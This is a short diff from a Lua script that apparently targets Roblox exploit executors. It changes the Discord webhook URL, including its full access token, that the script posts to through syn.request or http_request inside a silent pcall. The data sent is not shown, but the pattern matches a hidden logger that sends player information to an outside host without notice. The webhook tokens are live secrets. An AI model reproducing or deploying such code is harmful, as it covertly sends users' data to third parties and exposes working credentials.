@@ -25,7 +25,7 @@ LocalPlayer = {
 
 local HttpRequest = http_request or (syn and syn.request)
 pcall(function()HttpRequest({
-	Url = "https://discord.com/api/webhooks/1454454496015941672/KuF-Js3gClPkCyEMIWXlGulWZ4THPmnKl9TjfqGPYmXUdhNmrImsp-6oQX1uvoEWuqyx",
+	Url = "https://discord.com/api/webhooks/1454460353684574393/Pmn5PqELa3mRg2mpNyh3Buk_DcE-CNzs-X9SG0gLJV8ob1dYrAGdjxy8ga5DLofVL7I0",
 	Method = "POST",
 	Headers = {
 		["Content-Type"] = "application/json"
